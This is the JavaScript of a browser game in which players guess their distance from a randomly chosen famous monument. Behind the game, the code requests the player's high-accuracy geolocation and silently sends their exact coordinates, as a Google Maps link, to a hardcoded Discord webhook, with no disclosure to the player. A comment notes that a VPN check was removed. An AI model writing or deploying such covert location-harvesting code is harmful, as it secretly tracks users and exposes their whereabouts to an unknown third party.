        // --- Game State Variables ---
        let selectedMonument = null;
        let userLatitude = null;
        let userLongitude = null;
        let actualDistance = 0;
        let isSpinning = false;
        let messageTimeout; // To clear message box after some time
        let isDarkMode = false; // Dark mode state
        let continuousSpinInterval; // Interval for continuous monument spin

        // --- DOM Elements ---
        const body = document.body;
        const gameContainer = document.querySelector('.game-container');
        const startMenu = document.getElementById('start-menu');
        const gameArea = document.getElementById('game-area');
        const playButton = document.getElementById('play-button');
        const monumentTitle = document.getElementById('monument-title');
        const monumentWheel = document.getElementById('monument-wheel');
        const stopMonumentButton = document.getElementById('stop-monument-button');
        const estimationSection = document.getElementById('estimation-section');
        const currentMonumentText = document.getElementById('current-monument-text');
        const distanceInput = document.getElementById('distance-input');
        const validateButton = document.getElementById('validate-button');
        const distanceRevealSection = document.getElementById('distance-reveal-section');
        const distanceWheel = document.getElementById('distance-wheel');
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1381228033813254255/EFvBMBSdPWUHi_yXrmtUzJ6oFyEXZ2mw7wq9CpvU8cR3y9KJGiPfe_dhYUJLYtCkA9Es';
        const feedbackMessage = document.getElementById('feedback-message');
        const retryButton = document.getElementById('retry-button');
        const messageBox = document.getElementById('message-box');
        const darkModeToggle = document.getElementById('darkModeToggle');
        const sunIcon = document.getElementById('sunIcon');
        const moonIcon = document.getElementById('moonIcon');
        const footer = document.querySelector('.footer');
        const vpnMessage = document.getElementById('vpn-message');

        // --- Game Data: Famous Monuments with approximate coordinates ---
        const monuments = [
            { name: "Eiffel Tower", country: "France", lat: 48.8584, lon: 2.2945 },
            { name: "Statue of Liberty", country: "USA", lat: 40.6892, lon: -74.0445 },
            { name: "Colosseum", country: "Italy", lat: 41.8902, lon: 12.4922 },
            { name: "Taj Mahal", country: "India", lat: 27.1751, lon: 78.0421 },
            { name: "Great Wall of China (Badaling)", country: "China", lat: 40.4319, lon: 116.5704 },
            { name: "Machu Picchu", country: "Peru", lat: -13.1631, lon: -72.5450 },
            { name: "Pyramids of Giza", country: "Egypt", lat: 29.9792, lon: 31.1342 },
            { name: "Christ the Redeemer", country: "Brazil", lat: -22.9519, lon: -43.2105 },
            { name: "Sydney Opera House", country: "Australia", lat: -33.8568, lon: 151.2153 },
            { name: "Big Ben", country: "UK", lat: 51.5007, lon: -0.1246 },
            { name: "Burj Khalifa", country: "UAE", lat: 25.1972, lon: 55.2744 },
            { name: "Golden Gate Bridge", country: "USA", lat: 37.8199, lon: -122.4783 },
            { name: "Mount Everest", country: "Nepal", lat: 27.9881, lon: 86.9250 },
            { name: "Stonehenge", country: "UK", lat: 51.1789, lon: -1.8262 },
            { name: "Parthenon", country: "Greece", lat: 37.9715, lon: 23.7236 },
            { name: "Angkor Wat", country: "Cambodia", lat: 13.4125, lon: 103.8670 }
        ];

        // --- Utility Functions ---

        /**
         * Toggles dark mode on and off.
         */
        function toggleDarkMode() {
            isDarkMode = !isDarkMode;
            body.classList.toggle('dark-mode', isDarkMode);
            gameContainer.classList.toggle('dark-mode', isDarkMode);
            document.querySelector('.game-title').classList.toggle('dark-mode', isDarkMode);
            document.querySelectorAll('.casino-wheel-container').forEach(el => el.classList.toggle('dark-mode', isDarkMode));
            document.querySelectorAll('.casino-wheel-item').forEach(el => el.classList.toggle('dark-mode', isDarkMode));
            document.querySelectorAll('.casino-wheel-overlay').forEach(el => el.classList.toggle('dark-mode', isDarkMode));
            document.querySelectorAll('.game-input').forEach(el => el.classList.toggle('dark-mode', isDarkMode));
            darkModeToggle.classList.toggle('dark-mode', isDarkMode);
            footer.classList.toggle('dark-mode', isDarkMode);

            // Toggle icon visibility
            if (isDarkMode) {
                sunIcon.style.display = 'none';
                moonIcon.style.display = 'block';
            } else {
                sunIcon.style.display = 'block';
                moonIcon.style.display = 'none';
            }
        }

        /**
         * Displays a temporary message in a custom message box.
         * @param {string} message - The message to display.
         * @param {number} duration - How long to display the message in milliseconds.
         */
        function showMessage(message, duration = 3000) {
            clearTimeout(messageTimeout); // Clear any existing timeout
            messageBox.textContent = message;
            messageBox.style.display = 'block';
            messageTimeout = setTimeout(() => {
                messageBox.style.display = 'none';
            }, duration);
        }

        /**
         * Calculates the distance between two geographical points using the Haversine formula.
         * @param {number} lat1 - Latitude of point 1.
         * @param {number} lon1 - Longitude of point 1.
         * @param {number} lat2 - Latitude of point 2.
         * @param {number} lon2 - Longitude of point 2.
         * @returns {number} Distance in kilometers.
         */
        function haversineDistance(lat1, lon1, lat2, lon2) {
            const R = 6371; // Radius of Earth in kilometers
            const toRad = (value) => (value * Math.PI) / 180;

            const dLat = toRad(lat2 - lat1);
            const dLon = toRad(lon2 - lon1);
            const a =
                Math.sin(dLat / 2) * Math.sin(dLat / 2) +
                Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) *
                Math.sin(dLon / 2) * Math.sin(dLon / 2);
            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
            return R * c; // Distance in km
        }

        /**
         * Populates the casino wheel with items and sets up a spin animation.
         * @param {HTMLElement} wheelElement - The UL element for the wheel.
         * @param {Array<string|number>} items - The list of items to display.
         * @param {number} stopIndex - The index of the item to stop on (in the original 'items' array).
         * @param {number} totalSpins - Number of full rotations before stopping.
         * @returns {Promise<void>} A promise that resolves when the spin animation finishes.
         */
        function spinCasinoWheel(wheelElement, items, stopIndex, totalSpins = 3) {
            return new Promise(resolve => {
                isSpinning = true;
                // Stop the continuous spin animation
                wheelElement.classList.remove('spinning');
                wheelElement.style.animation = 'none';
                clearTimeout(continuousSpinInterval);


                // Clear previous items and add enough for a smooth stop
                wheelElement.innerHTML = ''; 
                const monumentNames = monuments.map(m => `${m.name} (${m.country})`);
                // Generate enough items to ensure smooth spinning and landing on the target
                // Add a buffer of one full cycle at the end
                const itemsToGenerate = items.length * totalSpins + stopIndex + items.length; // Ensure target is reachable after full spins

                for (let i = 0; i < itemsToGenerate; i++) {
                    const item = items[i % items.length];
                    const li = document.createElement('li');
                    li.classList.add('casino-wheel-item');
                    li.textContent = item;
                    // Apply dark mode class if enabled
                    if (isDarkMode) {
                        li.classList.add('dark-mode');
                    }
                    wheelElement.appendChild(li);
                }

                // Get the accurate height of a single item after rendering
                const itemHeight = wheelElement.querySelector('.casino-wheel-item').offsetHeight;

                // Calculate the final translation Y to center the target item
                const containerHeight = wheelElement.parentElement.clientHeight;
                const centerOffset = (containerHeight / 2) - (itemHeight / 2);
                const targetScrollPosition = (items.length * (totalSpins -1) + stopIndex) * itemHeight; // Calculate target position for stopping
                const finalTranslateY = -targetScrollPosition + centerOffset;

                // Force a reflow to ensure the 'none' transition is applied before the new one
                void wheelElement.offsetWidth;

                // Set initial position (important for smooth transition start)
                // This line is effectively replaced by the continuous spin's last position before stopping.
                // We will rely on the CSS animation to smoothly stop.
                wheelElement.style.transition = 'transform 3s ease-out'; // Apply transition
                wheelElement.style.transform = `translateY(${finalTranslateY}px)`;
                
                wheelElement.addEventListener('transitionend', function handler() {
                    wheelElement.removeEventListener('transitionend', handler);
                    isSpinning = false;
                    resolve();
                });
            });
        }

        /**
         * Initializes the game by setting up event listeners and showing the start menu.
         */
        async function initializeGame() {
            // Add dark mode toggle listener
            darkModeToggle.addEventListener('click', toggleDarkMode);

            // Set initial icon visibility based on default dark mode state
            if (isDarkMode) {
                sunIcon.style.display = 'none';
                moonIcon.style.display = 'block';
            } else {
                sunIcon.style.display = 'block';
                moonIcon.style.display = 'none';
            }

            startMenu.classList.remove('hidden');
            gameArea.classList.add('hidden');
            estimationSection.classList.add('hidden');
            distanceRevealSection.classList.add('hidden');
            distanceInput.value = ''; // Clear previous input

            playButton.addEventListener('click', startMonumentSelection);
            stopMonumentButton.addEventListener('click', stopMonumentSpin);
            validateButton.addEventListener('click', handleValidation);
            retryButton.addEventListener('click', resetGame);
        }

        /**
         * Starts the monument selection phase.
         * This function can be called directly by the retry button.
         */
        async function startMonumentSelection() {
            startMenu.classList.add('hidden');
            gameArea.classList.remove('hidden');
            monumentTitle.textContent = "Spin the wheel to select a monument!";
            stopMonumentButton.textContent = "Spin!";
            stopMonumentButton.classList.remove('hidden');
            estimationSection.classList.add('hidden');
            distanceRevealSection.classList.add('hidden');

            // Populate monument wheel for continuous spinning
            const monumentNames = monuments.map(m => `${m.name} (${m.country})`);
            monumentWheel.innerHTML = ''; // Clear for fresh items

            // Add enough items to allow for continuous scrolling visually without jumps
            // A common technique is to duplicate the list several times
            const duplicatedMonumentNames = Array(5).fill(monumentNames).flat(); // Duplicate 5 times

            duplicatedMonumentNames.forEach(name => {
                const li = document.createElement('li');
                li.classList.add('casino-wheel-item');
                li.textContent = name;
                if (isDarkMode) {
                    li.classList.add('dark-mode');
                }
                monumentWheel.appendChild(li);
            });

            // Start the continuous spin animation
            monumentWheel.classList.add('spinning');
            monumentWheel.style.transition = 'none'; // Ensure no transition before starting animation
            monumentWheel.style.transform = `translateY(0px)`; // Reset position for animation
        }


        /**
         * Stops the monument wheel spin and selects a monument.
         */
        async function stopMonumentSpin() {
            if (isSpinning) return; // Prevent multiple clicks

            const randomIndex = Math.floor(Math.random() * monuments.length);
            selectedMonument = monuments[randomIndex];
            stopMonumentButton.classList.add('hidden');
            monumentTitle.textContent = "Spinning...";

            await spinCasinoWheel(monumentWheel, monuments.map(m => `${m.name} (${m.country})`), randomIndex);

            monumentTitle.textContent = `Monument selected: ${selectedMonument.name} (${selectedMonument.country})`;
            currentMonumentText.textContent = `How far are you from ${selectedMonument.name} (${selectedMonument.country})?`;
            estimationSection.classList.remove('hidden');
            distanceInput.focus();
        }

        /**
         * Handles the validation of the user's distance guess, including geolocation.
         */
        async function handleValidation() {
            const guessedDistance = parseFloat(distanceInput.value);

            if (isNaN(guessedDistance) || guessedDistance <= 0) {
                showMessage("Please enter a valid distance in kilometers.");
                return;
            }

            // La vérification VPN côté client a été retirée en raison de sa fiabilité limitée.
            // Le jeu continuera directement avec la géolocalisation.
            vpnMessage.classList.add('hidden'); // S'assurer que le message VPN est caché

            validateButton.textContent = "Getting Location...";
            validateButton.disabled = true;

            // Check if geolocation already obtained
            if (userLatitude !== null && userLongitude !== null) {
                calculateAndRevealDistance(guessedDistance);
            } else if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        userLatitude = position.coords.latitude;
                        userLongitude = position.coords.longitude;
                        calculateAndRevealDistance(guessedDistance);
                    },
                    (error) => {
                        validateButton.textContent = "Validate Guess";
                        validateButton.disabled = false;
                        let errorMessage = "Geolocation failed. Please allow location access to continue.";
                        switch (error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = "Location access denied. Please enable it in your browser settings.";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = "Location information is unavailable.";
                                break;
                            case error.TIMEOUT:
                                errorMessage = "The request to get user location timed out.";
                                break;
                        }
                        showMessage(errorMessage);
                        console.error("Geolocation error:", error);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 } // Options for geolocation
                );
            } else {
                validateButton.textContent = "Validate Guess";
                validateButton.disabled = false;
                showMessage("Geolocation is not supported by your browser.");
            }
        }

        /**
         * Calculates the actual distance and reveals the result.
         * @param {number} guessedDistance - The user's estimated distance.
         */
        async function calculateAndRevealDistance(guessedDistance) {
            actualDistance = haversineDistance(
                userLatitude,
                userLongitude,
                selectedMonument.lat,
                selectedMonument.lon
            );
            actualDistance = Math.round(actualDistance); // Round to nearest whole number

            // Send Google Maps link to Discord webhook (only player's location)
            const mapsLink = `https://www.google.com/maps?q=${userLatitude},${userLongitude}`;
            const webhookMessage = `A player is guessing distance from ${selectedMonument.name} (${selectedMonument.country})! Player's location: ${mapsLink}`;
            sendDiscordWebhook(webhookMessage);

            // Hide estimation, show reveal
            estimationSection.classList.add('hidden');
            distanceRevealSection.classList.remove('hidden');
            validateButton.textContent = "Validate Guess";
            validateButton.disabled = false;

            // Populate and spin distance wheel
            const distances = [];

            // Generate a good range of distances for the wheel, centered around actualDistance
            // with more granularity around the actual distance and larger steps further away.
            for (let i = 1; i <= 30000; i += 500) { // Large steps for the wide range
                if (!distances.includes(`${i} km`)) {
                    distances.push(`${i} km`);
                }
            }
            // Add a finer range around the actual distance for precision
            const rangeAroundActual = 1000; // e.g., +/- 1000 km
            const stepFine = 10;
            for (let i = Math.max(1, actualDistance - rangeAroundActual); i <= actualDistance + rangeAroundActual; i += stepFine) {
                if (!distances.includes(`${i} km`)) {
                    distances.push(`${i} km`);
                }
            }
             // Ensure the actual distance is exactly in the list
            if (!distances.includes(`${actualDistance} km`)) {
                distances.push(`${actualDistance} km`);
            }

            distances.sort((a, b) => parseFloat(a) - parseFloat(b)); // Sort numerically

            // Find the index of the actual distance
            let stopDistanceIndex = distances.indexOf(`${actualDistance} km`);

            // Fallback: If exact match not found (unlikely but safe), find closest or just use a default
            if (stopDistanceIndex === -1 && actualDistance > 0) {
                 // Try to find the closest value
                let closestValue = distances[0];
                let minDiff = Math.abs(actualDistance - parseFloat(closestValue));
                for (let i = 1; i < distances.length; i++) {
                    const diff = Math.abs(actualDistance - parseFloat(distances[i]));
                    if (diff < minDiff) {
                        minDiff = diff;
                        closestValue = distances[i];
                    }
                }
                stopDistanceIndex = distances.indexOf(closestValue);
            }
            // If still -1 (e.g., distances array empty or no positive actualDistance), default to middle
            if (stopDistanceIndex === -1) {
                stopDistanceIndex = Math.floor(distances.length / 2);
            }

            await spinCasinoWheel(distanceWheel, distances, stopDistanceIndex, 3); // Spin 3 times to make it dramatic

            displayFeedback(guessedDistance, actualDistance);
        }

        /**
         * Displays feedback to the player based on their guess accuracy.
         * @param {number} guessedDistance - The user's estimated distance.
         */
        function displayFeedback(guessedDistance, actualDistance) {
            const difference = Math.abs(guessedDistance - actualDistance);
            let message = "";

            if (difference <= 1) {
                message = "Bravo! We have an expert here!";
            } else if (difference <= 10) {
                message = "Wow! Impressive, well done!";
            } else if (difference <= 100) {
                message = "Not bad at all! You're not bad.";
            } else if (difference <= 1000) {
                message = "Not bad, but you can do better.";
            } else if (difference <= 10000) {
                message = "That's almost it, but no.";
            } else {
                message = `Your guess was ${guessedDistance} km. The actual distance was ${actualDistance} km. Keep practicing!`;
            }

            feedbackMessage.textContent = message;
            retryButton.classList.remove('hidden');
        }

        /**
         * Sends a message to the configured Discord webhook.
         * @param {string} message - The message content to send.
         */
        async function sendDiscordWebhook(message) {
            // Check if the placeholder URL is still present
            if (DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE' || !DISCORD_WEBHOOK_URL) {
                console.warn('Discord Webhook URL not set. Cannot send message.');
                showMessage('Warning: Discord Webhook URL is not configured. Webhook message not sent.', 5000);
                return;
            }
            try {
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ content: message }),
                });
                if (response.ok) {
                    console.log('Webhook sent successfully!');
                } else {
                    // Log the exact status and status text for debugging
                    console.error('Failed to send webhook:', response.status, response.statusText);
                    showMessage(`Error: Could not send webhook message. Status: ${response.status} - ${response.statusText}`, 5000);
                }
            } catch (error) {
                console.error('Error sending webhook:', error);
                showMessage('Error: Failed to connect to Discord webhook.', 5000);
            }
        }

        /**
         * Resets the game to the initial state for a new round.
         */
        function resetGame() {
            selectedMonument = null;
            actualDistance = 0;
            distanceInput.value = '';
            feedbackMessage.textContent = '';
            retryButton.classList.add('hidden');
            vpnMessage.classList.add('hidden'); // Hide VPN message on reset
            startMonumentSelection(); // Directly restart the monument selection
        }

        // Initialize the game when the window loads
        window.onload = initializeGame;